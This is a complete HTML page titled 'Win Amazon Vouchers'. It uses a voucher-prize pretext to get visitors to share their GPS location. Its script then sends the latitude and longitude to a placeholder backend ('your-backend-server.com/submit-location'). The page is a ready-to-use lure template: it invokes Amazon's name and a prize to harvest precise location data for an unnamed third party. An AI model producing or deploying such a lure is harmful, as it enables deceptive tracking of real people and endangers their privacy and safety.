<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Win Amazon Vouchers</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            text-align: center;
        }

        h1 {
            color: #333;
            font-size: 24px;
        }

        p {
            color: #555;
            font-size: 16px;
        }

        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #45a049;
        }

        #result {
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
            color: #d9534f;
        }

        .offer {
            margin-top: 10px;
            font-size: 18px;
            color: #28a745;
            font-weight: bold;
        }
    </style>
    <script>
        // Function to request location
        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude } = position.coords;
                        
                        // Send location to the backend
                        fetch('https://your-backend-server.com/submit-location', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({ latitude, longitude }),
                        })
                        .then((response) => response.json())
                        .then((data) => {
                            document.getElementById('result').innerText = `Location sent successfully: Latitude ${latitude}, Longitude ${longitude}`;
                            document.getElementById('offer').innerText = `Offer: ${data.offer}`;
                        })
                        .catch((error) => {
                            document.getElementById('result').innerText = `Error sending location: ${error}`;
                        });
                    },
                    (error) => {
                        document.getElementById('result').innerText = `Error fetching location: ${error.message}`;
                    }
                );
            } else {
                document.getElementById('result').innerText = "Geolocation is not supported by this browser.";
            }
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>Enable Location to Check Offers</h1>
        <p>Click the button below to share your GPS location:</p>
        <button onclick="requestLocation()">Share Location</button>
        <p id="result"></p>
        <p id="offer" class="offer"></p>
    </div>
</body>
</html>
